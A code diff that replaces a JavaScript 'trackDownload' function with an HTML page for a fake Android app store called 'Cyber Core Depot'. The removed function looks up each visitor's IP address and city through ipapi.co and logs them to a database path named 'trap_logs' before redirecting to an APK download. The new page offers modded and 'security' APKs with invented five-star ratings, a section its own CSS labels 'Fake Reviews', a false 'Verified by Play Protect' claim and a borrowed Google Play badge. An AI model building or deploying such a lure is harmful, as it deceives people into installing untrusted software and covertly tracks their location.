@@ -1,16 +1,85 @@
-function trackDownload(appName) {
-        fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            db.ref('trap_logs').push({
-                app: appName,
-                ip: data.ip,
-                city: data.city,
-                time: new Date().toLocaleString()
-            });
-            
-            // මේක තමයි APK එක බාගන්න යන ලින්ක් එක
-            // උදා: Lightroom_Pro.apk කියලා එකක් උඹ GitHub එකට දානවා නම්:
-            window.location.href = appName + ".apk"; 
-        });
-    }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber-Core Depot | Premium Android Tools</title>
+    <style>
+        /* Dark Dragon Theme Style */
+        body { background-color: #0d1117; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .header { padding: 40px 0; border-bottom: 2px solid #21262d; }
+        .logo { width: 120px; border-radius: 50%; border: 3px solid #58a6ff; }
+        
+        /* App Grid Layout */
+        .app-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; margin-top: 30px; }
+        .app-card { background: #161b22; border: 1px solid #30363d; border-radius: 15px; width: 280px; padding: 20px; transition: 0.3s; }
+        .app-card:hover { border-color: #58a6ff; transform: translateY(-5px); }
+        .app-card img { width: 80px; border-radius: 18px; }
+        .rating { color: #f1c40f; font-size: 14px; margin: 5px 0; }
+        .dl-btn { background-color: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
+        
+        /* Fake Reviews Section */
+        .reviews { margin-top: 50px; background: #161b22; padding: 30px; border-radius: 15px; text-align: left; max-width: 800px; margin-left: auto; margin-right: auto; }
+        .review-item { border-bottom: 1px solid #30363d; padding: 15px 0; }
+        .review-item b { color: #58a6ff; }
+
+        footer { margin-top: 50px; color: #8b949e; font-size: 12px; }
+        .verified-badge { width: 150px; margin-top: 20px; opacity: 0.7; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://cdn-icons-png.flaticon.com/512/2592/2592231.png" alt="Dragon Logo" class="logo">
+        <h1>CYBER CORE DEPOT</h1>
+        <p>Premium & Modded Android Applications - All Verified by Play Protect</p>
+    </div>
+
+    <div class="app-container">
+        <div class="app-card">
+            <img src="https://cdn-icons-png.flaticon.com/512/2983/2983791.png" alt="TurboNet">
+            <h3>TurboNet Speed Booster</h3>
+            <p class="rating">⭐⭐⭐⭐⭐ (4.9/5)</p>
+            <p style="font-size: 12px; color: #8b949e;">Optimize ping and stabilize LTE/5G signals for gaming.</p>
+            <button class="dl-btn" onclick="window.location.href='TurboNet_Speed_Booster.apk'">DIRECT DOWNLOAD</button>
+        </div>
+
+        <div class="app-card">
+            <img src="https://cdn-icons-png.flaticon.com/512/1067/1067566.png" alt="Security">
+            <h3>Dragon Security Shield</h3>
+            <p class="rating">⭐⭐⭐⭐⭐ (4.8/5)</p>
+            <p style="font-size: 12px; color: #8b949e;">Deep system scan to protect against modern threats.</p>
+            <button class="dl-btn" onclick="window.location.href='Dragon_Security.apk'">DIRECT DOWNLOAD</button>
+        </div>
+
+        <div class="app-card">
+            <img src="https://cdn-icons-png.flaticon.com/512/5968/5968502.png" alt="Lightroom">
+            <h3>Lightroom Premium Mod</h3>
+            <p class="rating">⭐⭐⭐⭐ (4.7/5)</p>
+            <p style="font-size: 12px; color: #8b949e;">All premium presets unlocked for free.</p>
+            <button class="dl-btn" onclick="alert('Server Busy - Please try again later')">DOWNLOAD</button>
+        </div>
+
+        </div>
+
+    <div class="reviews">
+        <h3>User Feedback</h3>
+        <div class="review-item">
+            <b>Amila Sandun:</b> "පට්ට App එකක්. මගේ Dialog එකේ speed එක double වුණා. Thanks Cyber Core!"
+        </div>
+        <div class="review-item">
+            <b>Nuwan_99:</b> "Data ඉවර වෙන්නෙත් නෑ දැන්. පට්ට!"
+        </div>
+        <div class="review-item">
+            <b>Sarah Jenkins:</b> "Best security app I've ever used. My phone feels much faster."
+        </div>
+    </div>
+
+    <img src="https://www.gstatic.com/android/market_images/web/play_prism_h_400.png" class="verified-badge" alt="Verified Badge">
+
+    <footer>
+        <p>© 2026 CYBER CORE TEAM | ALL RIGHTS RESERVED | POWERED BY DARK DRAGON TECHNOLOGY</p>
+    </footer>
+
+</body>
+</html>
